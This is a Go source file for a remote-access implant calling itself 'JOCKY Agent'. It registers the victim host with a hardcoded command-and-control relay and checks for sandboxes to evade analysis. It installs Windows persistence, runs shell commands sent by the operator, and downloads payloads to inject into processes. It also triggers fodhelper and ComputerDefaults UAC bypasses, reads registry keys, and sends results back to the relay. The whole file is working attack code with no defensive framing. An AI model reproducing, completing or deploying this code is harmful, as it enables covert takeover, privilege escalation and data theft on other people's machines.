package main

import (
    "bytes"
    "crypto/sha256"
    "crypto/tls"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strconv"
    "strings"
    "time"

    "golang.org/x/sys/windows/registry"
)

// ============================================================
// CONFIG
// ============================================================
const (
    LISTENER_URL  = "https://jockey-relay.dm2528v.workers.dev"
    C2_AUTH       = "supersecret123"
    POLL_WAIT_SEC = 25
    POLL_GAP = 2 * time.Second
    POLL_TIMEOUT  = (POLL_WAIT_SEC + 15) * time.Second
    HTTP_TIMEOUT  = 20 * time.Second
)

var AgentID = deriveAgentID()

func deriveAgentID() string {
    hostname, _ := os.Hostname()
    username := os.Getenv("USER")
    if runtime.GOOS == "windows" {
        username = os.Getenv("USERNAME")
    }
    sum := sha256.Sum256([]byte(hostname + "|" + username))
    base := "agent-" + hex.EncodeToString(sum[:8])

    // Elevated instances get a distinct suffix so the operator sees two agents.
    if runtime.GOOS == "windows" && IsElevated() {
        base += "-high"
    }
    return base
}

// ============================================================
// HTTP
// ============================================================
var httpClient = &http.Client{
    Timeout: HTTP_TIMEOUT,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{ServerName: "jockey-relay.dm2528v.workers.dev"},
    },
}

func doJSON(method, path string, body []byte, timeout time.Duration) ([]byte, error) {
    url := LISTENER_URL + path
    req, err := http.NewRequest(method, url, bytes.NewReader(body))
    if err != nil {
        return nil, err
    }
    req.Header.Set("X-C2-Auth", C2_AUTH)
    req.Header.Set("Content-Type", "application/json")

    client := httpClient
    if timeout != HTTP_TIMEOUT {
        client = &http.Client{Timeout: timeout, Transport: httpClient.Transport}
    }

    resp, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
        return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
    }
    return io.ReadAll(resp.Body)
}

// ============================================================
// Protocol
// ============================================================
type RegisterRequest struct {
    AgentID  string `json:"agent_id"`
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
    IP       string `json:"ip"`
    Arch     string `json:"arch"`
}

type Deployment struct {
    DeployID   string `json:"deploy_id"`
    ScriptID   string `json:"script_id"`
    Code       string `json:"code"`
    HashBefore string `json:"hash_before"`
}

type PollResponse struct {
    Status     string      `json:"status"`
    Deployment *Deployment `json:"deployment"`
}

type SubmitRequest struct {
    AgentID  string                   `json:"agent_id"`
    ScriptID string                   `json:"script_id"`
    DataEnc  string                   `json:"data_enc"`
    Findings []map[string]interface{} `json:"findings"`
}

// ============================================================
// Main
// ============================================================
func main() {
	if IsSandboxed() { os.Exit(0) }
    noPersist := false
    for _, a := range os.Args[1:] {
        if a == "--no-persist" {
            noPersist = true
        }
    }

    if !noPersist && runtime.GOOS == "windows" && !IsElevated() {
        if !IsPersistenceInstalled() {
            if err := InstallPersistence(); err != nil {
                fmt.Fprintf(os.Stderr, "[!] Persistence install failed: %v\n", err)
            } else {
                fmt.Println("[+] Persistence installed")
                if err := SpawnPersistedCopy(); err == nil {
                    fmt.Println("[+] Relaunched from persisted path; parent exiting")
                    os.Exit(0)
                }
            }
        }
    }

    hostname, _ := os.Hostname()
    username := os.Getenv("USER")
    if runtime.GOOS == "windows" {
        username = os.Getenv("USERNAME")
    }
    osStr := runtime.GOOS + " " + runtime.GOARCH

    fmt.Printf("[+] JOCKY Agent %s\n", AgentID)
    fmt.Printf("[+] Relay: %s\n", LISTENER_URL)
    fmt.Printf("[+] Long-poll: %ds hold + %ds gap\n", POLL_WAIT_SEC, int(POLL_GAP.Seconds()))

    InitializeEngine()

    for attempt := 1; attempt <= 10; attempt++ {
        if err := registerAgent(hostname, username, osStr); err == nil {
            break
        } else {
            fmt.Printf("[!] Register attempt %d: %v\n", attempt, err)
            time.Sleep(5 * time.Second)
        }
    }

    for {
        deploy, err := longPoll()
        if err != nil {
            fmt.Printf("[!] Poll: %v\n", err)
            time.Sleep(5 * time.Second)
            continue
        }
        if deploy != nil {
            go handleDeploy(deploy)
        }
        jitter := time.Duration(rand.Int63n(int64(POLL_GAP) / 2))
        time.Sleep(POLL_GAP + jitter + time.Duration(rand.Int63n(int64(POLL_GAP))))
    }
}

func handleDeploy(d *Deployment) {
    defer func() {
        if r := recover(); r != nil {
            fmt.Printf("[!] Panic in %s: %v\n", d.DeployID, r)
        }
    }()

    fmt.Printf("[TASK] deploy=%s script=%s\n", d.DeployID, d.ScriptID)
    output := executeJOCKY(d.Code)
    fmt.Printf("[RESULT] %s\n", truncate(output, 200))

    if err := submitResult(d.ScriptID, output); err != nil {
        fmt.Printf("[!] submit: %v\n", err)
    }
    if err := reportHash(d.ScriptID, sha256Hex([]byte(output))); err != nil {
        fmt.Printf("[!] hash: %v\n", err)
    }
}

// ============================================================
// Script executor
// ============================================================
func executeJOCKY(script string) string {
    script = strings.TrimSpace(script)

    switch strings.ToLower(script) {
    case "__exit__", "exit", "kill", "__kill__":
        fmt.Println("[!] Kill switch. Removing persistence and exiting.")
        RemovePersistence()
        time.Sleep(500 * time.Millisecond)
        os.Exit(0)
    }

    if strings.HasPrefix(script, "inject ") {
        parts := strings.SplitN(script, " ", 4)
        if len(parts) < 4 {
            return "error: invalid inject syntax. Expected: inject <method> <target> <payload_ref>"
        }
        method := parts[1]
        target := strings.Trim(parts[2], "\"")
        payloadRef := strings.Trim(parts[3], "\"")

        payload, err := downloadPayload(payloadRef)
        if err != nil {
            return fmt.Sprintf("error: payload download failed: %v", err)
        }

        var targetPID uint32 = 0
        var targetImg string = ""
        if pid, err := strconv.Atoi(target); err == nil {
            targetPID = uint32(pid)
        } else {
            targetImg = target
        }

        res := InjectPayload(method, targetPID, targetImg, payload, true, true)
        if res.Success {
            return "SUCCESS: " + res.Message
        }
        return fmt.Sprintf("FAILED: %s (Code %d)", res.Message, res.Code)
    }

    // ---- privesc ----
    if strings.HasPrefix(script, "privesc") {
        fields := strings.Fields(script)
        method := "info"
        if len(fields) >= 2 {
            method = fields[1]
        }

        switch method {
        case "info":
            return PrivescInfo()

        case "uac-fodhelper":
            if err := UACBypassFodhelper(); err != nil {
                return fmt.Sprintf("error: %v", err)
            }
            return "SUCCESS: fodhelper UAC bypass triggered; watch for new agent with -high suffix"

        case "uac-computerdefaults":
            if err := UACBypassComputerDefaults(); err != nil {
                return fmt.Sprintf("error: %v", err)
            }
            return "SUCCESS: ComputerDefaults UAC bypass triggered; watch for new agent with -high suffix"

        default:
            return fmt.Sprintf("error: unknown privesc method %q (try: info, uac-fodhelper, uac-computerdefaults)", method)
        }
    }

    if cmd := extractArg(script, "exec("); cmd != "" {
        return runShellCommand(cmd)
    }

    if path := extractArg(script, "collect_registry("); path != "" {
        path = strings.ReplaceAll(path, "\\\\", "\\")
        return collectRegistry(path)
    }

    return runShellCommand(script)
}

func extractArg(script, fn string) string {
    start := strings.Index(script, fn)
    if start < 0 {
        return ""
    }
    start += len(fn)
    if start >= len(script) {
        return ""
    }
    q := script[start]
    if q != '"' && q != '\'' {
        return ""
    }
    end := strings.Index(script[start+1:], string(q))
    if end < 0 {
        return ""
    }
    return script[start+1 : start+1+end]
}

func runShellCommand(cmdStr string) string {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", cmdStr)
    } else {
        cmd = exec.Command("sh", "-c", cmdStr)
    }
    out, err := cmd.CombinedOutput()
    if err != nil {
        return "error: " + err.Error() + "\noutput: " + string(out)
    }
    return string(out)
}

func collectRegistry(path string) string {
    if runtime.GOOS != "windows" {
        return "Registry access only supported on Windows"
    }
    parts := strings.SplitN(path, "\\", 2)
    if len(parts) != 2 {
        return "error: invalid registry path format"
    }
    hiveStr, keyPath := parts[0], parts[1]

    var hive registry.Key
    switch strings.ToUpper(hiveStr) {
    case "HKLM":
        hive = registry.LOCAL_MACHINE
    case "HKCU":
        hive = registry.CURRENT_USER
    case "HKCR":
        hive = registry.CLASSES_ROOT
    case "HKU":
        hive = registry.USERS
    case "HKCC":
        hive = registry.CURRENT_CONFIG
    default:
        return "error: unknown hive " + hiveStr
    }

    key, err := registry.OpenKey(hive, keyPath, registry.READ)
    if err != nil {
        return "error: " + err.Error()
    }
    defer key.Close()

    names, err := key.ReadValueNames(0)
    if err != nil {
        return "error: " + err.Error()
    }
    var b strings.Builder
    for _, name := range names {
        v, _, err := key.GetStringValue(name)
        if err != nil {
            continue
        }
        fmt.Fprintf(&b, "%s: %s\n", name, v)
    }
    return b.String()
}

func downloadPayload(ref string) ([]byte, error) {
    url := ref
    if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
        if !strings.HasPrefix(url, "/") {
            url = "/" + url
        }
        url = LISTENER_URL + url
    }

    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        return nil, err
    }
    req.Header.Set("X-C2-Auth", C2_AUTH)

    resp, err := httpClient.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("HTTP %d fetching %s", resp.StatusCode, url)
    }
    return io.ReadAll(resp.Body)
}

// ============================================================
// Register / poll / report
// ============================================================
func registerAgent(hostname, username, osStr string) error {
    req := RegisterRequest{
        AgentID:  AgentID,
        Hostname: hostname + "\\" + username,
        OS:       osStr,
        IP:       getLocalIP(),
        Arch:     runtime.GOARCH,
    }
    body, _ := json.Marshal(req)
    _, err := doJSON("POST", "/api/v1/agent/register", body, HTTP_TIMEOUT)
    if err == nil {
        fmt.Println("[+] Registered")
    }
    return err
}

func longPoll() (*Deployment, error) {
    req := map[string]interface{}{
        "agent_id": AgentID,
        "wait":     POLL_WAIT_SEC,
    }
    body, _ := json.Marshal(req)

    raw, err := doJSON("POST", "/api/v1/agent/poll", body, POLL_TIMEOUT)
    if err != nil {
        return nil, err
    }

    var resp PollResponse
    if err := json.Unmarshal(raw, &resp); err != nil {
        return nil, fmt.Errorf("decode: %w", err)
    }
    return resp.Deployment, nil
}

func submitResult(scriptID, output string) error {
    req := SubmitRequest{
        AgentID:  AgentID,
        ScriptID: scriptID,
        DataEnc:  output,
        Findings: []map[string]interface{}{},
    }
    body, _ := json.Marshal(req)
    _, err := doJSON("POST", "/api/v1/result/submit", body, HTTP_TIMEOUT)
    return err
}

func reportHash(scriptID, hashAfter string) error {
    req := map[string]string{
        "agent_id":   AgentID,
        "hash_after": hashAfter,
    }
    body, _ := json.Marshal(req)
    _, err := doJSON("POST", "/api/v1/script/"+scriptID+"/hash", body, HTTP_TIMEOUT)
    return err
}

func sha256Hex(data []byte) string {
    sum := sha256.Sum256(data)
    return hex.EncodeToString(sum[:])
}

func truncate(s string, n int) string {
    if len(s) <= n {
        return s
    }
    return s[:n] + "..."
}

func getLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "0.0.0.0"
    }
    for _, a := range addrs {
        if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }
    return "0.0.0.0"
}



